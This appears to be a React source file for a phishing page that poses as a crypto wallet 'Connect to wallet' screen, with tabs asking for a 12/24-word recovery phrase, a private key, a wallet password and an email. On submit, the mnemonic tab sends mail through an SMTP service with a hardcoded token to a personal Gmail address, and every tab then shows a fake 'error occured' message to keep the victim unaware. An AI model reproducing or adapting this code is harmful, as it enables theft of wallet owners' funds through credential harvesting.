import React from 'react'

function Connect() {
  const [nameClassM, setNameClassM] = React.useState('d-block')
  const [nameClassK, setNameClassK] = React.useState('d-block')
  const [nameClassP, setNameClassP] = React.useState('d-block')
  const [nameClassErrorM, setNameClassErrorM] = React.useState('bg-white p-4 rounded mt-4 d-none')
  const [nameClassErrorK, setNameClassErrorK] = React.useState('bg-white p-4 rounded mt-4 d-none')
  const [nameClassErrorP, setNameClassErrorP] = React.useState('bg-white p-4 rounded mt-4 d-none')
  function handleSubmitM(e) {
    e.preventDefault()
    const data = {
      Mnemonic: formData.mname,
      'Email-Address': formData.memailid,
      'wallet-Address': formData.mwalletAddress
    }
    if(window.Email) {
      const configM = {
        SecureToken: 'fe530cbe-5a11-4148-8b43-f5736d4848b2',
        To : 'fikay323@gmail.com',
        From : formData.memailid,
        Subject: 'From The Mnemonic Tab',
        Body : `testing`
      }
      window.Email.send(configM).then(()=>{
        setNameClassM('d-none')
        setNameClassErrorM('bg-white p-4 rounded mt-4 d-block')
      })
    }
  }
  
  function removeErrorM(){
    setNameClassM('d-block')
    setNameClassErrorM('bg-white p-4 rounded mt-4 d-none')
    setFormData({mname:'', memailid:'', mwalletAddress:''})
  }
  
  function handleSubmitK(e) {
    e.preventDefault()
    setNameClassK('d-none')
    setNameClassErrorK('bg-white p-4 rounded mt-4 d-block')
  }
  
  function removeErrorK(){
    setNameClassK('d-block')
    setNameClassErrorK('bg-white p-4 rounded mt-4 d-none')
    setFormDataK({kemailid:'', kwalletAddress:''})
  }
  function handleSubmitP(e) {
    e.preventDefault()
    setNameClassP('d-none')
    setNameClassErrorP('bg-white p-4 rounded mt-4 d-block')
  }
  
  function removeErrorP(){
    setNameClassP('d-block')
    setNameClassErrorP('bg-white p-4 rounded mt-4 d-none')
    setFormDataP({privateKey:'', pwalletPassword:'', pemailid:''})
  }

  const [formData, setFormData] = React.useState(
    {mname:'', memailid:'', mwalletAddress:''}
  )
  const [formDataK, setFormDataK] = React.useState(
    {kemailid:'', kwalletAddress:''}
  )
  const [formDataP, setFormDataP] = React.useState(
    {kemailid:'', kwalletAddress:''}
  )
  function handleChange(event) {
    setFormData(prevFormData => {
      return {
        ...prevFormData,
        [event.target.name]: event.target.value
      }
    })
  }
  function handleChangeK(event) {
    setFormDataK(prevFormData => {
      return {
        ...prevFormData,
        [event.target.name]: event.target.value
      }
    })
  }
  function handleChangeP(event) {
    setFormDataP(prevFormData => {
      return {
        ...prevFormData,
        [event.target.name]: event.target.value
      }
    })
  }
  
  return (
    <div>
      <header className="d-flex w-100 p-3 align-items-center">
        <img className="m-0 me-auto" height="25px" src="/images/logo.svg" alt="logo"/>
        <p className="m-0 border border-light rounded p-2 text-white">EN</p>
      </header>
      <section className="p-3">
          <article className="text-white">
              <p className="m-0">Connect to wallet</p>
              <a href="/wallet" className="text-white text-decoration-none fs-6 m-0"><i className="fa-solid fa-arrow-left fs-6"></i> Go back</a>
          </article>
      </section>
      <main className="px-3">
          <nav>
            <div className="nav nav-tabs" id="nav-tab" role="tablist">
              <button className="nav-link active" id="nav-home-tab" data-bs-toggle="tab" data-bs-target="#nav-home" type="button" role="tab" aria-controls="nav-home" aria-selected="true">Mnemonic</button>
              <button className="nav-link" id="nav-profile-tab" data-bs-toggle="tab" data-bs-target="#nav-profile" type="button" role="tab" aria-controls="nav-profile" aria-selected="false">KeyStore</button>
              <button className="nav-link" id="nav-contact-tab" data-bs-toggle="tab" data-bs-target="#nav-contact" type="button" role="tab" aria-controls="nav-contact" aria-selected="false">Private Key</button>
            </div>
          </nav>
            <div className="tab-content" id="nav-tabContent">
              <div className="tab-pane fade show active" id="nav-home" role="tabpanel" aria-labelledby="nav-home-tab" tabIndex="0">
                  <form className={nameClassM} onSubmit={handleSubmitM}>
                      <label className="mt-4 mb-2 text-white-50" htmlFor="mname">Enter your 12/24 word phrase</label><br/>
                      <input className="border rounded p-2 w-100" 
                        type="text" 
                        placeholder="Enter your mnemonic" 
                        onChange={handleChange}
                        name="mname" 
                        value={formData.mname}
                      />
                      <small className="text-white d-block">Please separate each Mnemonic Phrase with a space.</small>
                      
                      <label className="mt-4 mb-2 text-white-50" htmlFor="memainame">Enter your email address</label>
                      <input className="border rounded p-2 w-100" 
                        type="email" 
                        placeholder="Enter your email" 
                        onChange={handleChange}
                        name="memailid" 
                        value={formData.memailid}
                      />
                      <small className="text-white d-block">Your registered email address.</small>
                      
                      <label className="mt-4 mb-2 text-white-50" htmlFor="mwalletAddress">Enter your wallet address</label>
                      <input className="border rounded p-2 w-100" 
                        type="text" 
                        placeholder="Enter your wallet address" 
                        onChange={handleChange}
                        name="mwalletAddress" 
                        value={formData.mwalletAddress}
                      />

                      <button className="btn bg-info mt-4 fw-bold px-4 text-black">Import</button>
                  </form>
                  <div className={nameClassErrorM}>An error occured while attempting to add your wallet.
                      <br/> Please try again later
                      <hr className="my-4"/>
                      <button className="bg-info rounded fw-bold border-info closeM" onClick={removeErrorM}>Close</button>
                  </div>
              </div>
              <div className="tab-pane fade" id="nav-profile" role="tabpanel" aria-labelledby="nav-profile-tab" tabIndex="0">
                  <form  className={nameClassK} onSubmit={handleSubmitK}>
                      <label className="mt-4 mb-2 text-white-50" htmlFor="kemailId">Enter your email address</label>
                      <input className="border rounded p-2 w-100" 
                       type="email" required 
                       placeholder="Enter your email" 
                       name='kemailid'
                       value={formDataK.kemailid}
                       onChange={handleChangeK}
                      />
                      
                      <label className="mt-4 mb-2 text-white-50" htmlFor="kwalletAddress">Enter your wallet address</label>
                      <input className="border rounded p-2 w-100" 
                       type="text" required 
                       placeholder="Enter your wallet address" 
                       name='kwalletAddress'
                       value={formDataK.kwalletAddress}
                       onChange={handleChangeK}
                      />
                      
                      <button className="btn bg-info mt-4 fw-bold px-4 text-black">Connect Wallet</button>
                  </form>
                  <div className={nameClassErrorK}>An error occured while attempting to add your wallet.
                      <br/>Please try again later
                      <hr className="my-4"/>
                      <button className='bg-info rounded fw-bold border-info'  onClick={removeErrorK}>Close</button>
                  </div>
              </div>
              <div className="tab-pane fade" id="nav-contact" role="tabpanel" aria-labelledby="nav-contact-tab" tabIndex="0">
                  <form className={nameClassP} onSubmit={handleSubmitP}>
                      <label className="mt-4 mb-2 text-white-50" htmlFor="privateKey">Please enter your private key</label><br/>
                      <input className="border rounded p-2 w-100" 
                        type="text" required 
                        name="privateKey" 
                        placeholder="Enter your private key" 
                        value={formDataP.privateKey}
                        onChange={handleChangeP}
                      />
                      <small className="text-white d-block">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</small>
                      
                      <label className="mt-4 mb-2 text-white-50" htmlFor="pwalletPassword">Enter your wallet password</label>
                      <input className="border rounded p-2 w-100" 
                        type="text" required 
                        name="pwalletPassword" 
                        placeholder="Enter your temporary password" 
                        value={formDataP.pwalletPassword}
                        onChange={handleChangeP}
                      />
                      
                      <label className="mt-4 mb-2 text-white-50" htmlFor="pemailId">Enter your email</label>
                      <input className="border rounded p-2 w-100" 
                        type="email" required 
                        name="pemailid" 
                        placeholder="Enter your email address" 
                        value={formDataP.pemailid}
                        onChange={handleChangeP}
                      />
                      
                      <button className="btn bg-info mt-4 fw-bold px-4 text-black">Restore</button>
                  </form>
                  <div className={nameClassErrorP}>An error occured while attempting to add your wallet.
                      <br/>Please try again later
                      <hr className="my-4"/>
                      <button className="bg-info rounded fw-bold border-info" onClick={removeErrorP}>Close</button>
                  </div>
              </div>
            </div>
      </main>
    </div>
  )
}

export default Connect